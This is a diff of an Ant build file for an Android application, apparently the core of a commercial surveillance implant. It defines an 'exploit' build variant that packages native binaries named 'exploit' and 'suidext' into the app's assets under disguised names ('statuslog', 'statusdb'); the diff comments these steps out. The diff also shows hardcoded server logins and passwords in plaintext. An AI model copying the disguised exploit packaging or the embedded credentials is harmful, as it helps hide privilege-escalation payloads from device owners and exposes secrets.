@@ -161,8 +161,8 @@
 					<var name="isdebug" value="true" />
 					<var name="isexploit" value="false" />
 					<copy file="preprocess/config.debug.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<delete file="assets/statuslog" />
-					<delete file="assets/statusdb" />
+					<!-- <delete file="assets/statuslog" />
+					 <copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
 				</case>
 				<case value="release">
 					<echo message="set release" />
@@ -170,8 +170,8 @@
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="false" />
 					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<delete file="assets/statuslog" />
-					<delete file="assets/statusdb" />
+					<!--<delete file="assets/statuslog" />
+					<copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
 				</case>
 				<case value="exploit">
 					<echo message="set exploit" />
@@ -179,8 +179,8 @@
 					<var name="isdebug" value="false" />
 					<var name="isexploit" value="true" />
 					<copy file="preprocess/config.release.bin" toFile="res/raw/config.bin" overwrite="true" />
-					<copy file="libs/armeabi/statuslog" toDir="assets/" overwrite="true" />
-					<copy file="libs/armeabi/statusdb" toDir="assets/" overwrite="true" />
+					<!--<copy file="libs/armeabi/exploit" toFile="assets/statuslog" overwrite="true" />
+					<copy file="libs/armeabi/suidext" toFile="assets/statusdb" overwrite="true" /> -->
 				</case>
 			</switch>
 
@@ -191,6 +191,7 @@
 					<filter token="BUILD_ID" value="${build.number}" />
 					<filter token="BUILD_TIMESTAMP" value="${timestamp.BUILD}" />
 					<filter token="DEBUG" value="${isdebug}" />
+					<!-- TODO RIMETTERE!!!! filter token="EXCEPTION" value="${isdebug}" / -->
 					<filter token="EXCEPTION" value="${isdebug}" />
 					<filter token="EXPLOIT" value="${isexploit}" />
 					<filter token="DEMO" value="false" />
@@ -274,7 +275,12 @@
 	</target>
 
 	<target name="update">
-		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file="bin/core.android" filename="core" />
+		<updaterelease server="rcs-castore" login="zenobatch" password="zenop123" file=".\server\android_${version}.zip" />
+	</target>
+  
+  <target name="updatezenotto">
+		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
+		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
 	</target>
 
 	<target name="help">
@@ -339,10 +345,7 @@
 		</for>
 	</target>
 
-	<target name="updatezenotto">
-		<updaterelease server="zenotto" login="admin" password="adminp123" file=".\server\android_${version}.zip" />
-		<!-- <copy file=".\server\blackberry_${version}.zip" toFile="W:\RELEASE\SVILUPPO\cores daVinci\android.zip" overwrite="true" /> -->
-	</target>
+
 
 	<target name="servercore">
 		<delete dir="server/core" />
